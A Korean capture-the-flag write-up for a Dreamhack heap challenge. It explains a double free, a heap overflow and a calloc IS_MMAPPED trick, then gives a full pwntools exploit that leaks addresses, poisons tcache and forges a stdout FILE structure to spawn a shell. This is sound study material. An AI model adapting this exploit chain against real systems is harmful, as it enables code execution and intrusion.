
cancel에 double free 취약점, edit에 heap overflow 취약점이 있다.
## [breaking calloc](https://k0n9.tistory.com/entry/breaking-calloc#breaking%20calloc-1)

calloc 함수를 호출하면 라이브러리의 내부에서 \_\_libc_calloc 함수를 호출한다.
\_\_libc_calloc 함수 내부에서는 \_int_malloc 함수로 동적 할당을 하고 할당된 메모리를 memset 함수를 통해 초기화 한다.
calloc 함수에서 힙 청크의 size에 IS_MMAPPED 비트가 설정되어 있다면 memset 함수를 호출하지 않는다.
즉 heap overflow 혹은 oob를 통해 free된 chunk의 size에 IS_MMAPPED bit 를 set하고 해당 chunk를 재할당하면 memset 없이 할당되어있을 것이다.

초기화가 안되므로 heap_base를 알 수 있고, 이를 이용해서 bss영역에 청크를 할당한다. bss영역에서 libc_base를 알아내고 stdout FSOP를 이용해서 쉘을 딴다.

```python
from pwn import *
from tqdm import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('host3.dreamhack.games', 9125)
#p = process('./yisf_hospital')
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def reservation(num : int, disease : bytes, name : bytes):
    p.sendlineafter(b'>>> ', b'1')
    p.recvuntil(b'what date will you make a reservation')
    p.sendlineafter(b'>>> ', str(num).encode())
    p.sendafter(b'>>> ', disease)
    p.recvuntil(b'disease : ')
    dis = p.recvline()[:-1]
    p.sendafter(b'>>> ', name)
    p.recvuntil(b'name : ')
    na = p.recvline()[:-1]
    return dis, na

def reservation_cancel(num : int):
    p.sendlineafter(b'>>> ', b'2')
    p.recvuntil(b'What date are you going to cancel your reservation')
    p.sendlineafter(b'>>> ', str(num).encode())

def reservation_edit(num : int, disease : bytes, name : bytes):
    p.sendlineafter(b'>>> ', b'3')
    p.recvuntil(b'What date are you going to modify your reservation')
    p.sendlineafter(b'>>> ', str(num).encode())
    p.sendafter(b'>>> ', disease)
    p.sendafter(b'>>> ', name)

def review(payload : bytes):
    p.sendlineafter(b'>>> ', b'5')
    msg = p.recvn(6)
    if b'How' in msg : p.sendafter(b'> ', payload)

def unlink_heap(num : int):
    res = 0
    last = 0
    n = list()
    while num > 0:
        n.append(num & ((1 << 12) - 1))
        num >>= 12

    for i in range(len(n) - 1, -1, -1):
        n[i] ^= last
        res <<= 12
        res += n[i]
        last = n[i]
    
    return res

p.sendafter(b'>>> ', b'a')

for _ in trange(7):
    reservation(10, b'a', b'a')
    reservation_cancel(10)
    
reservation(1, b'a', b'a')
reservation(2, b'a', b'a')
reservation(3, b'a', b'a')
reservation_cancel(3)
reservation_cancel(2)
reservation_edit(1, b'\x23', b'a' * 8)
heap_base, _ = reservation(2, b'\x01', b'a')
heap_base = ((unlink_heap(u64(heap_base.ljust(8, b'\x00'))) >> 12) << 12)
print(hex(heap_base))

for i in trange(0x21):
    review(b'a')

reservation(3, b'0', b'0')
reservation(4, b'0', b'0')
reservation(7, b'a', b'a')
reservation(10, b'a', b'a')
reservation_cancel(3)
reservation_cancel(4)
reservation_cancel(3)
reservation(3, p64(0x404080 ^ (heap_base >> 12)), b'a')
reservation(4, b'a', b'a')
reservation(5, b'a', b'a')
reservation(6, b'a', p64(0x404018))
reservation_edit(1, b'\x23', b'\x00')

reservation_cancel(3)
reservation_cancel(4)
reservation_cancel(3)
reservation(3, p64(0x404010 ^ (heap_base >> 12)), b'a')
reservation(4, b'a', b'a')
reservation(8, b'a', b'a')
libc_base, _ = reservation(9, b'\x80', b'\xa0')
l.address = u64(libc_base.ljust(8, b'\x00')) - l.sym['_IO_2_1_stdout_']
print(hex(l.address))

fake_fsop_struct = heap_base + 0x3c0
stdout_lock = l.address + (0x7f524d079a70 - 0x7f524ce5d000)
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)

for i in trange(len(FSOP) // 8):
    reservation_edit(6, b'a', p64(fake_fsop_struct + 8 * i))
    reservation_edit(1, FSOP[8 * i : 8 * (i + 1)], b'\x00')

reservation_edit(6, b'a', p64(0x404018))
reservation_edit(1, b'\x23', b'\x00')

#gdb.attach(p)
reservation_cancel(4)
reservation_cancel(5)
reservation_cancel(7)
reservation_cancel(10)
reservation_cancel(7)
reservation(7, p64(0x404010 ^ (heap_base >> 12)), b'a')
reservation(10, b'a', b'a')
reservation(4, b'a', b'a')

#gdb.attach(p)
p.sendlineafter(b'>>> ', b'1')
p.recvuntil(b'what date will you make a reservation')
p.sendlineafter(b'>>> ', str(5).encode())
p.sendafter(b'>>> ', p64(fake_fsop_struct))

p.interactive()
```